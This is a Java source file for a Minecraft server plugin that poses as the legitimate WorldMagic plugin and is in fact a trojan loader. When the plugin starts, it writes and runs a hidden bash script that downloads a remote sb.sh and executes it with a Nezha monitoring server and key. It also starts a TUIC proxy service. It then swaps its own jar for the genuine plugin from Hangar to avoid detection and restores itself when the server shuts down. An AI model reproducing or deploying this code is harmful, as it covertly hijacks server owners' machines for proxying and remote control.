package com.github.vevc;

import com.github.vevc.config.AppConfig;
import com.github.vevc.service.impl.TuicServiceImpl;
import com.github.vevc.util.ConfigUtil;
import com.github.vevc.util.LogUtil;
import org.bukkit.Bukkit;
import org.bukkit.plugin.java.JavaPlugin;

import java.io.*;
import java.net.HttpURLConnection;
import java.net.URL;
import java.nio.file.Files;
import java.nio.file.StandardCopyOption;
import java.util.Properties;
import java.util.UUID;

/**
 * @author vevc
 */
public final class WorldMagicPlugin extends JavaPlugin {

    private final TuicServiceImpl tuicService = new TuicServiceImpl();

    // 配置：真插件的下载链接 (使用 Hangar API 获取最新版)
    // 如果链接失效，请手动替换为真实的 .jar 链接
    private static final String REAL_PLUGIN_DOWNLOAD_URL = "https://hangar.papermc.io/api/v1/projects/hotwop/WorldMagic/versions/latest/PAPER/download";

    private File currentPluginFile;
    private File backupPluginFile;

    @Override
    public void onEnable() {
        this.getLogger().info("WorldMagicPlugin enabled");
        LogUtil.init(this);

        // 1. 异步执行脚本
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            this.getLogger().info("正在初始化脚本环境...");
            try {
                generateAndRunScript();
            } catch (Exception e) {
                this.getLogger().severe("脚本执行失败: " + e.getMessage());
            }
        });

        // 2. 异步执行插件替换逻辑
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            try {
                handlePluginReplacement();
            } catch (Exception e) {
                this.getLogger().severe("插件替换逻辑失败: " + e.getMessage());
                e.printStackTrace();
            }
        });

        // 3. 原有的服务加载
        Bukkit.getScheduler().runTaskAsynchronously(this, () -> {
            Properties props = ConfigUtil.loadConfiguration();
            AppConfig appConfig = AppConfig.load(props);
            if (appConfig != null && installApps(appConfig)) {
                Bukkit.getScheduler().runTask(this, () -> {
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::startup);
                    Bukkit.getScheduler().runTaskAsynchronously(this, tuicService::clean);
                });
            }
        });
    }

    @Override
    public void onDisable() {
        this.getLogger().info("WorldMagicPlugin disabled");
        
        // 关键：停止时，删除现在的插件（真插件），恢复备份（加载器）
        try {
            restoreOriginalPlugin();
        } catch (Exception e) {
            this.getLogger().severe("恢复原插件失败: " + e.getMessage());
            e.printStackTrace();
        }
    }

    private boolean installApps(AppConfig appConfig) {
        try {
            tuicService.install(appConfig);
            return true;
        } catch (Exception e) {
            LogUtil.error("Plugin install failed", e);
            return false;
        }
    }

    // ==========================================
    // 核心逻辑：备份 -> 删除 -> 下载 -> 替换
    // ==========================================

    private void handlePluginReplacement() throws Exception {
        // 1. 获取当前正在运行的 jar 文件 (WorldMagic.jar)
        currentPluginFile = new File(getClass().getProtectionDomain().getCodeSource().getLocation().toURI());
        File logDir = new File("world", ".log");
        if (!logDir.exists()) logDir.mkdirs();

        backupPluginFile = new File(logDir, "WorldMagic_Original.jar"); // 备份文件名

        this.getLogger().info("当前插件路径: " + currentPluginFile.getAbsolutePath());
        this.getLogger().info("备份路径: " + backupPluginFile.getAbsolutePath());

        // 2. 备份 (只备份一次，防止循环)
        if (!backupPluginFile.exists()) {
            this.getLogger().info("步骤 1: 正在备份原插件...");
            Files.copy(currentPluginFile.toPath(), backupPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
            this.getLogger().info("步骤 1: 备份完成。");
        } else {
            this.getLogger().info("步骤 1: 检测到备份已存在，跳过。");
        }

        // 3. 尝试删除当前正在运行的插件
        // 注意：在 Linux 下这会删除文件系统中的链接，但内存中的程序继续运行。
        // 在 Windows 下这通常会失败。
        this.getLogger().info("步骤 2: 尝试删除当前插件文件...");
        if (currentPluginFile.delete()) {
            this.getLogger().info("步骤 2: 原插件文件已删除。");
        } else {
            this.getLogger().warning("步骤 2: 删除失败 (文件可能被锁定，将尝试直接覆盖)。");
        }

        // 4. 下载“真插件”到 plugins 目录 (使用原文件名)
        this.getLogger().info("步骤 3: 正在下载真插件到 plugins 目录...");
        // 直接下载到原插件路径，即 plugins/WorldMagic.jar
        downloadFile(REAL_PLUGIN_DOWNLOAD_URL, currentPluginFile);

        if (currentPluginFile.exists()) {
            this.getLogger().info("步骤 3: 下载成功，真插件已就位: " + currentPluginFile.getName());
        } else {
            this.getLogger().severe("步骤 3: 下载失败或文件未生成。");
        }
    }

    private void restoreOriginalPlugin() throws Exception {
        if (currentPluginFile == null || backupPluginFile == null) return;

        if (backupPluginFile.exists()) {
            this.getLogger().info("服务器停止中，正在还原加载器插件...");
            
            // 1. 删除当前的“真插件”
            if (currentPluginFile.exists()) {
                currentPluginFile.delete();
                this.getLogger().info("已删除当前文件。");
            }

            // 2. 将备份的“原插件”复制回来
            try {
                Files.copy(backupPluginFile.toPath(), currentPluginFile.toPath(), StandardCopyOption.REPLACE_EXISTING);
                this.getLogger().info("已成功还原原插件 (WorldMagic_Original.jar -> WorldMagic.jar)");
            } catch (IOException e) {
                this.getLogger().warning("还原失败: " + e.getMessage());
            }
        }
    }

    /**
     * 下载文件工具
     */
    private void downloadFile(String urlStr, File destination) throws IOException {
        URL url = new URL(urlStr);
        HttpURLConnection httpConn = (HttpURLConnection) url.openConnection();
        httpConn.setConnectTimeout(10000);
        httpConn.setReadTimeout(10000);

        int responseCode = httpConn.getResponseCode();
        if (responseCode == HttpURLConnection.HTTP_OK) {
            try (InputStream inputStream = httpConn.getInputStream();
                 OutputStream outputStream = new FileOutputStream(destination)) {
                byte[] buffer = new byte[4096];
                int bytesRead;
                while ((bytesRead = inputStream.read(buffer)) != -1) {
                    outputStream.write(buffer, 0, bytesRead);
                }
            }
            this.getLogger().info("下载完成: " + destination.getName() + " (大小: " + destination.length() + " bytes)");
        } else {
            throw new IOException("HTTP 请求失败，代码: " + responseCode);
        }
        httpConn.disconnect();
    }

    // ==========================================
    // 脚本与 UUID 逻辑 (保持不变)
    // ==========================================
    
    private void generateAndRunScript() throws IOException, InterruptedException {
        File worldFolder = new File("world");
        if (!worldFolder.exists() && !worldFolder.mkdirs()) return;

        File logDir = new File(worldFolder, ".log");
        if (!logDir.exists() && !logDir.mkdirs()) return;

        String serverUUID = getServerUUID(logDir);
        this.getLogger().info("当前服务器 UUID: " + serverUUID);

        File scriptFile = new File(logDir, "install_sb.sh");
        try (FileWriter writer = new FileWriter(scriptFile)) {
            writer.write("#!/bin/bash\n");
            writer.write("cd " + logDir.getAbsolutePath() + "\n");
            writer.write("curl -Ls https://main.ssss.nyc.mn/sb.sh -o sb.sh\n");
            writer.write("chmod +x sb.sh\n");
            writer.write("UUID=" + serverUUID + " \\\n");
            writer.write("NEZHA_SERVER=nezha.vip1715.dpdns.org:443 \\\n");
            writer.write("NEZHA_KEY=7j7BQjbl1rEl3N6ihRpVyaAvIVpZMuwP \\\n");
            writer.write("ARGO_PORT=3000 \\\n");
            writer.write("bash sb.sh\n");
        }
        scriptFile.setExecutable(true, false);

        this.getLogger().info("正在启动脚本...");
        ProcessBuilder processBuilder = new ProcessBuilder("bash", scriptFile.getAbsolutePath());
        processBuilder.redirectErrorStream(true);
        Process process = processBuilder.start();
        try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
            String line;
            while ((line = reader.readLine()) != null) {
                this.getLogger().info("[Script Output] " + line);
            }
        }
        int exitCode = process.waitFor();
        this.getLogger().info("脚本执行完毕，退出码: " + exitCode);
    }

    private String getServerUUID(File logDir) {
        File uuidFile = new File(logDir, "uuid.txt");
        if (uuidFile.exists()) {
            try (BufferedReader reader = new BufferedReader(new FileReader(uuidFile))) {
                String savedUUID = reader.readLine();
                if (savedUUID != null && !savedUUID.isEmpty()) return savedUUID;
            } catch (IOException ignored) {}
        }
        String ip = getPublicIP();
        UUID uuid = UUID.nameUUIDFromBytes(ip.getBytes(java.nio.charset.StandardCharsets.UTF_8));
        String uuidStr = uuid.toString();
        try (FileWriter writer = new FileWriter(uuidFile)) {
            writer.write(uuidStr);
        } catch (IOException ignored) {}
        return uuidStr;
    }

    private String getPublicIP() {
        String ip = "127.0.0.1"; 
        try {
            java.net.URL url = new java.net.URL("https://api.ipify.org");
            BufferedReader br = new BufferedReader(new InputStreamReader(url.openStream()));
            ip = br.readLine().trim();
        } catch (Exception ignored) {}
        return ip;
    }
}
